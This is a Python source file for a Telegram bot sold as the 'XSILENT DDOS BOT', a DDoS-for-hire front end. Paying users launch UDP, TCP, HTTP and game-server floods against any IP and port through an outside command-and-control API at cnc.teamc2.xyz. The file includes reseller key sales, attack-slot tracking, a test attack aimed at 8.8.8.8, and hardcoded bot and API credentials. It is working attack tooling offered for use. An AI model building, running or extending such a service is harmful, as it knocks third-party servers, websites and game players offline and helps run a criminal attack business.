#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
from datetime import datetime, timedelta
from collections import defaultdict

# ========== CONFIG ==========
BOT_TOKEN = "8760406918:AAFcsvc7QKoBJR5cGcLmyjLyoYmyFzOSlGM"
ADMIN_ID = ["8487946379"]
USERS_FILE = "users.json"
KEYS_FILE = "keys.json"
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"  # Note: 5001 not 500
API_KEY = "PFC10J"

# ========== DATA STRUCTURES ==========
active_attacks = {}  # {target: {"user": user_id, "finish_time": timestamp, "ip": ip, "port": port}}
cooldown = {}
user_keys = {}  # {user_id: key}
resellers = []  # Reseller user IDs

# ========== FILE FUNCTIONS ==========
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"users": [ADMIN_ID[0]], "resellers": []}

def load_keys():
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(data):
    with open(USERS_FILE, 'w') as f:
        json.dump(data, f)

def save_keys(data):
    with open(KEYS_FILE, 'w') as f:
        json.dump(data, f)

# Load data
users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()

# ========== BOT INIT ==========
bot = telebot.TeleBot(BOT_TOKEN)

# ========== HELPER FUNCTIONS ==========
def generate_key():
    """Generate a random 16-character key"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def check_active_attack(target):
    """Check if target is under attack"""
    now = time.time()
    for attack_target, attack_info in list(active_attacks.items()):
        if attack_target == target:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_target]
                return None
    return None

def format_attack_status(attack_info):
    """Format attack status message"""
    if not attack_info:
        return "✅ Slot Free - No ongoing attack"
    
    remaining = int(attack_info["finish_time"] - time.time())
    if remaining <= 0:
        return "✅ Slot Free - No ongoing attack"
    
    return f"""⚠️ SLOT BUSY ⚠️

🎯 Target: {attack_info['ip']}:{attack_info['port']}
👤 Attacker: {attack_info['user']}
⏰ Finishes in: {remaining} seconds
🕐 Finish Time: {datetime.fromtimestamp(attack_info['finish_time']).strftime('%H:%M:%S')}"""

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.chat.id)
    if uid in users or uid in ADMIN_ID:
        bot.reply_to(msg, f"""🔥 XSILENT DDOS BOT 🔥

✅ Status: Authorized
⚡ Methods: UDP (Auto) | TCP | HTTP | OVH | GAME
⏱️ Max Time: 300s
🌐 API: Power by CNC

📝 COMMANDS:
/attack IP PORT TIME
/status - Check attack slot status
/methods - Show attack methods
/stats - Your stats
/genkey - Generate access key (Reseller/Admin)
/addreseller - Add reseller
/broadcast - Send message to all users
/help - Help menu

👑 ADMIN: /add /remove /allusers /stopattack

Buy: XSILENT""")
    else:
        bot.reply_to(msg, "❌ Unauthorized! Buy access: XSILENT")

@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    # Check cooldown
    if uid in cooldown:
        remaining = 30 - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
            return
    
    args = msg.text.split()
    if len(args) != 4:
        bot.reply_to(msg, "Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 443 60\n💡 UDP method is auto-applied")
        return
    
    ip, port, duration = args[1], args[2], args[3]
    
    try:
        port = int(port)
        duration = int(duration)
        if duration < 10 or duration > 300:
            bot.reply_to(msg, "❌ Duration 10-300 seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid port or time!")
        return
    
    # Check if target already under attack
    target_key = f"{ip}:{port}"
    existing_attack = check_active_attack(target_key)
    
    if existing_attack:
        remaining = int(existing_attack["finish_time"] - time.time())
        bot.reply_to(msg, f"""❌ TARGET UNDER ATTACK!

🎯 {ip}:{port} is already being attacked
👤 By: {existing_attack['user']}
⏰ Finishes in: {remaining} seconds

Please wait or choose another target!""")
        return
    
    # Apply cooldown
    cooldown[uid] = time.time()
    
    # Store attack info
    finish_time = time.time() + duration
    active_attacks[target_key] = {
        "user": uid,
        "finish_time": finish_time,
        "ip": ip,
        "port": port,
        "start_time": time.time()
    }
    
    bot.reply_to(msg, f"""🔥 ATTACK LAUNCHED! 🔥

🎯 Target: {ip}:{port}
⏱️ Duration: {duration}s
⚡ Method: UDP (Auto)
💥 Status: Attack in progress...

Use /status to check slot availability""")
    
    def run():
        try:
            # Auto UDP method
            api_params = {
                "api_key": API_KEY,
                "target": ip,
                "port": port,
                "time": duration,
                "concurrent": 1,
                "method": "udp"
            }
            
            response = requests.get(API_URL, params=api_params, timeout=10)
            
            if response.status_code != 200:
                bot.send_message(msg.chat.id, f"❌ Attack failed!\nStatus: {response.status_code}")
                # Remove from active attacks if failed
                if target_key in active_attacks:
                    del active_attacks[target_key]
            else:
                # Wait for attack to finish
                time.sleep(duration)
                bot.send_message(msg.chat.id, f"""✅ ATTACK FINISHED!

🎯 Target: {ip}:{port}
⏱️ Duration: {duration}s
💥 Attack completed!

🔄 Restart your game/client if needed
📊 Use /status to check slot""")
                # Remove from active attacks
                if target_key in active_attacks:
                    del active_attacks[target_key]
                
        except Exception as e:
            bot.send_message(msg.chat.id, f"❌ Attack error: {str(e)[:50]}")
            if target_key in active_attacks:
                del active_attacks[target_key]
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status(msg):
    """Check attack slot status"""
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    # Check all active attacks
    now = time.time()
    active_list = []
    
    for target, info in active_attacks.items():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            active_list.append(f"🎯 {target}\n   👤 {info['user']}\n   ⏰ {remaining}s left\n   🕐 {datetime.fromtimestamp(info['finish_time']).strftime('%H:%M:%S')}")
        else:
            del active_attacks[target]
    
    if active_list:
        status_msg = f"""⚠️ SLOT STATUS ⚠️

❌ SLOT BUSY!
{'='*30}
{chr(10).join(active_list)}
{'='*30}

💡 Total active attacks: {len(active_list)}
🔄 Please wait for attack to finish before starting new one"""
    else:
        status_msg = """✅ SLOT STATUS ✅

✅ SLOT FREE!
No ongoing attacks detected

💡 You can start a new attack now!
Use: /attack IP PORT TIME"""
    
    bot.reply_to(msg, status_msg)

@bot.message_handler(commands=['stopattack'])
def stop_attack(msg):
    """Admin command to stop any ongoing attack"""
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /stopattack IP:PORT\nExample: /stopattack 1.1.1.1:443")
        return
    
    target = args[1]
    
    if target in active_attacks:
        attack_info = active_attacks[target]
        del active_attacks[target]
        bot.reply_to(msg, f"""✅ ATTACK STOPPED!

🎯 Target: {target}
👤 Attacker: {attack_info['user']}
⏰ Original finish: {datetime.fromtimestamp(attack_info['finish_time']).strftime('%H:%M:%S')}
👑 Stopped by: Admin {uid}

Attack has been terminated!""")
        
        # Notify the attacker
        try:
            bot.send_message(attack_info['user'], f"⚠️ Your attack on {target} was stopped by admin!")
        except:
            pass
    else:
        bot.reply_to(msg, f"❌ No active attack found on {target}")

@bot.message_handler(commands=['genkey'])
def genkey(msg):
    """Generate access key (Admin/Reseller only)"""
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /genkey USER_ID\nExample: /genkey 123456789")
        return
    
    target_user = args[1]
    
    if target_user in users:
        bot.reply_to(msg, f"❌ User {target_user} already exists!")
        return
    
    # Generate key
    key = generate_key()
    keys_data[key] = {
        "user_id": target_user,
        "generated_by": uid,
        "generated_at": time.time(),
        "used": False
    }
    save_keys(keys_data)
    
    bot.reply_to(msg, f"""✅ KEY GENERATED!

🔑 Key: {key}
👤 For User: {target_user}
👑 Generated by: {uid}
📅 Expires: Never

Share this key with the user!
User should use: /redeem {key}""")

@bot.message_handler(commands=['redeem'])
def redeem(msg):
    """Redeem access key"""
    uid = str(msg.chat.id)
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /redeem KEY")
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ Invalid key!")
        return
    
    key_info = keys_data[key]
    
    if key_info["used"]:
        bot.reply_to(msg, "❌ Key already used!")
        return
    
    if key_info["user_id"] != uid:
        bot.reply_to(msg, f"❌ This key is for user {key_info['user_id']} only!")
        return
    
    # Activate user
    if uid not in users:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    
    # Mark key as used
    keys_data[key]["used"] = True
    keys_data[key]["used_at"] = time.time()
    keys_data[key]["used_by"] = uid
    save_keys(keys_data)
    
    bot.reply_to(msg, f"""✅ ACCESS GRANTED!

🎉 User {uid} has been activated!
🔑 Key: {key}
📅 Activated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

You now have access to all bot commands!
Use /start to see available commands.""")

@bot.message_handler(commands=['addreseller'])
def add_reseller(msg):
    """Add reseller (Admin only)"""
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /addreseller USER_ID")
        return
    
    new_reseller = args[1]
    
    if new_reseller in resellers:
        bot.reply_to(msg, f"❌ User {new_reseller} is already a reseller!")
        return
    
    resellers.append(new_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    
    bot.reply_to(msg, f"""✅ RESELLER ADDED!

👤 Reseller: {new_reseller}
🔑 Can now generate keys using /genkey

Reseller commands:
/genkey USER_ID - Generate access keys""")

@bot.message_handler(commands=['broadcast'])
def broadcast(msg):
    """Send message to all users (Admin only)"""
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    
    args = msg.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /broadcast MESSAGE\nExample: /broadcast Server maintenance at 2 AM")
        return
    
    message = args[1]
    
    success_count = 0
    fail_count = 0
    
    for user in users:
        try:
            bot.send_message(user, f"""📢 BROADCAST MESSAGE 📢

{message}

🕐 Sent: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👑 From: Admin""")
            success_count += 1
        except:
            fail_count += 1
    
    bot.reply_to(msg, f"""✅ BROADCAST SENT!

📨 Message: {message}
✅ Delivered: {success_count} users
❌ Failed: {fail_count} users
👥 Total users: {len(users)}""")

@bot.message_handler(commands=['methods'])
def methods(msg):
    bot.reply_to(msg, """⚡ ATTACK METHODS (UDP AUTO) ⚡

💡 UDP FLOOD (Auto-Applied)
   - Best for gaming (BGMI, Minecraft, GTA)
   - Recommended ports: 443, 8080, 14000, 27015-27030
   - Auto UDP method - no need to specify!

📝 OTHER SUPPORTED METHODS:
   - TCP: Web servers (80, 443, 8080)
   - HTTP: Websites (80, 443)
   - OVH: Bypass protection (53, 80, 443)
   - GAME: Game servers (25565, 27015, 7777)

🎯 USAGE:
/attack IP PORT TIME

Example: /attack 1.1.1.1 443 60
→ Auto uses UDP method""")

@bot.message_handler(commands=['stats'])
def stats(msg):
    uid = str(msg.chat.id)
    is_admin = uid in ADMIN_ID
    is_reseller = uid in resellers
    
    stats_msg = f"""📊 USER STATISTICS

👤 User ID: {uid}
✅ Status: {'Authorized' if uid in users else 'Not Authorized'}
👑 Role: {'Admin' if is_admin else 'Reseller' if is_reseller else 'User'}
⏰ Cooldown: {'Active' if uid in cooldown else 'None'}

📈 SYSTEM INFO:
• Total Users: {len(users)}
• Total Resellers: {len(resellers)}
• Active Attacks: {len(active_attacks)}
• API Status: Active

💡 Commands available: /status /attack /methods"""
    
    if is_admin:
        stats_msg += f"\n\n🔑 Keys generated: {len(keys_data)}"
    
    bot.reply_to(msg, stats_msg)

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    uid = str(msg.chat.id)
    is_admin = uid in ADMIN_ID
    is_reseller = uid in resellers
    
    help_text = """🔥 XSILENT DDOS BOT HELP 🔥

📝 USER COMMANDS:
/attack IP PORT TIME - Launch UDP attack
/status - Check attack slot status
/methods - Show attack methods
/stats - Your statistics
/help - This menu
/redeem KEY - Redeem access key

"""
    
    if is_reseller or is_admin:
        help_text += """👑 RESELLER COMMANDS:
/genkey USER_ID - Generate access key
/addreseller USER_ID - Add new reseller (Admin only)

"""
    
    if is_admin:
        help_text += """⚡ ADMIN COMMANDS:
/add USER_ID - Add user
/remove USER_ID - Remove user
/allusers - List all users
/stopattack IP:PORT - Stop any attack
/broadcast MESSAGE - Send to all users
/genkey USER_ID - Generate key
/addreseller USER_ID - Add reseller
/api_status - Check API status

"""
    
    help_text += """💡 TIPS:
• UDP method is auto-applied
• Max attack time: 300 seconds
• Cooldown: 30 seconds between attacks
• Check /status before attacking

Buy: XSILENT"""
    
    bot.reply_to(msg, help_text)

# ========== ADMIN COMMANDS ==========
@bot.message_handler(commands=['add'])
def add_user(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /add USER_ID")
        return
    new = args[1]
    if new not in users:
        users.append(new)
        users_data["users"] = users
        save_users(users_data)
        bot.reply_to(msg, f"✅ User {new} added!")
    else:
        bot.reply_to(msg, "User already exists!")

@bot.message_handler(commands=['remove'])
def remove_user(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /remove USER_ID")
        return
    rem = args[1]
    if rem in users and rem not in ADMIN_ID:
        users.remove(rem)
        users_data["users"] = users
        save_users(users_data)
        bot.reply_to(msg, f"✅ User {rem} removed!")

@bot.message_handler(commands=['allusers'])
def all_users(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    user_list = "\n".join(users)
    bot.reply_to(msg, f"📋 ALL USERS:\n{user_list}\n\nTotal: {len(users)}\n👑 Admins: {', '.join(ADMIN_ID)}\n💎 Resellers: {', '.join(resellers) if resellers else 'None'}")

@bot.message_handler(commands=['api_status'])
def api_status(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    
    try:
        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
        status = f"""🌐 API STATUS

📡 API URL: {API_URL}
🔑 API Key: {API_KEY[:6]}...{API_KEY[-4:]}
✅ Status: {'Online' if test_response.status_code == 200 else 'Offline'}
📊 Response Code: {test_response.status_code}
🎯 Active Attacks: {len(active_attacks)}"""
        bot.reply_to(msg, status)
    except:
        bot.reply_to(msg, "🌐 API STATUS: OFFLINE\nCannot connect to API server!")

# ========== CLEANUP THREAD ==========
def cleanup_attacks():
    """Periodically clean up finished attacks"""
    while True:
        time.sleep(5)
        now = time.time()
        for target, info in list(active_attacks.items()):
            if now >= info["finish_time"]:
                del active_attacks[target]

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
cleanup_thread.start()

# ========== MAIN ==========
print("""
╔══════════════════════════════════════════════════╗
║         🔥 XSILENT BOT STARTED 🔥                ║
║         Enhanced Version with All Features       ║
╠══════════════════════════════════════════════════╣
║  ✅ Bot Online                                   ║
║  ✅ Admin: 8487946379                            ║
║  ✅ Auto UDP Method                              ║
║  ✅ Attack Slot Management                       ║
║  ✅ /stopattack Command                          ║
║  ✅ /genkey & /addreseller System                ║
║  ✅ /broadcast Feature                           ║
║  ✅ /status Check with Attack Info               ║
╚══════════════════════════════════════════════════╝
""")

bot.infinity_polling()
